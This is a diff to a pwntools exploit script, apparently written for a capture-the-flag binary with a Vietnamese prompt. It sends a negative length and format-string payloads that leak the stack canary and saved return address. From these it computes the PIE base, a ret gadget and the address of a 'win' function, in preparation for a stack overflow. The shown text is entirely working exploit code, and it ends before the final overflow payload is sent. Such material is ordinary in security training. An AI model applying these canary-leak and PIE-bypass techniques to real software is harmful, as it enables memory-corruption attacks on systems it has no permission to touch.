@@ -14,25 +14,23 @@ p = process(exe.path)
 
 canary_address = 0x7fffffffdd78
 buff_address = 0x7fffffffdd20
-saved_rip = 0x7fffffffdd88
 canary_offset = canary_address - buff_address
 
 p.recvuntil(b'Nhap do dai tin nhan:')
 p.sendline(b'-1')
 
-payload1 = b'%1$p.%19$p.%21$p'
+payload1 = b'%19$p.%21$p'
 p.sendline(payload1)
 
 data_leak = p.recvuntil(b'\n', drop=True).strip().split(b'.')
-buf_leak = data_leak[0]
-canary = data_leak[1]
-saved_rip_leak = data_leak[2]
+canary = data_leak[0]
+saved_rip_leak = data_leak[1]
 base_address = int(saved_rip_leak, 16) - 0x13dc
-ret_gadget = base_address + 0x101a
+ret_gadget = base_address + 0x101a # ret; gadget
 win_func = base_address + exe.symbols['win']
 
-log.info(f'Buffer Leak: {buf_leak}')
 log.info(f'Canary: {canary}')
+log.info(f'Canary offset: {canary_offset}')
 log.info(f'Saved RIP: {saved_rip_leak}')
 log.info(f'Base Address: {hex(base_address)}') # PIE base
 log.info(f'Ret Gadget Address: {hex(ret_gadget)}') # for stack alignment
